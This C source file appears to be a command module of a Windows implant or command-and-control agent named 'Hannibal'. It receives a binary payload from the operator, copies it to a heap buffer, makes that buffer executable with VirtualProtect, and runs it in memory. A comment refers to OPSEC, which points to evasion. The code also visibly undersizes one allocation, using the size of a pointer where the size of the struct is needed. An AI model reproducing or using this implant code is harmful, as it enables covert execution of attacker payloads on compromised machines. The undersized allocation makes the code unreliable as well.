#include "config.h"

#ifdef INCLUDE_CMD_EXECUTE_HBIN

#include "hannibal_tasking.h"

/**
 * Allocating a buffer and marking it RX obviously has OPSEC implications. 
 * Modify as you need.
 */
SECTION_CODE void cmd_execute_hbin(TASK t)
{
    HANNIBAL_INSTANCE_PTR

    CMD_EXECUTE_HBIN *exec_hbin = (CMD_EXECUTE_HBIN *)t.cmd;

    /**
     * Make sure this struct matches what's in the hbin template.
     */
    typedef struct _HBIN_IN {
        LPVOID args;
        int arg_size;
        LPVOID hannibal_instance;
        char *controller_uuid;
    } HBIN_IN;

    HBIN_IN *in = (HBIN_IN *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(HBIN_IN *));
    
    in->args = exec_hbin->args;
    in->arg_size = exec_hbin->arg_size;
    in->hannibal_instance = hannibal_instance_ptr;
    in->controller_uuid = t.task_uuid;

    size_t buffer_size = sizeof(HBIN_IN*) + exec_hbin->hbin_size;

    UINT8 *hbin_buff = (UINT8 *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, buffer_size);

    // ptr to ptr > HBIN_IN | HBIN

    if(hbin_buff != NULL){
        pic_memcpy(hbin_buff, &in, sizeof(HBIN_IN*));
        pic_memcpy(hbin_buff + sizeof(HBIN_IN*), exec_hbin->hbin, exec_hbin->hbin_size);
    }

    DWORD OldProtection  = 0;
    hannibal_instance_ptr->Win32.VirtualProtect( hbin_buff, buffer_size, PAGE_EXECUTE_READ, &OldProtection );

    UINT_PTR exec = (UINT_PTR)hbin_buff + sizeof(HBIN_IN*);

    typedef void (*exec_func)(); 
    exec_func hbin_exec = (exec_func)exec;
    hbin_exec();

    // If you don't put a task response in the response queue, the uuid won't
    // get freed and that is a leak. Either do it in there or here.

    // TASK response_t;

    // response_t.output = (LPCSTR)response_content;
    // response_t.output_size = CURRENT_BUFFER_USAGE;
    // response_t.task_uuid = t.task_uuid;

    // task_enqueue(hannibal_instance_ptr->tasks.tasks_response_queue, &response_t);

    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, in);
    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, hbin_buff);
    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, exec_hbin->args);
    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, exec_hbin->hbin);
    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, t.cmd);
    // hannibal_instance_ptr->Win32.VirtualFree(t.task_uuid, 0, MEM_RELEASE); // Make sure your hbin sends a response so this gets freed in post_tasks

}

#endif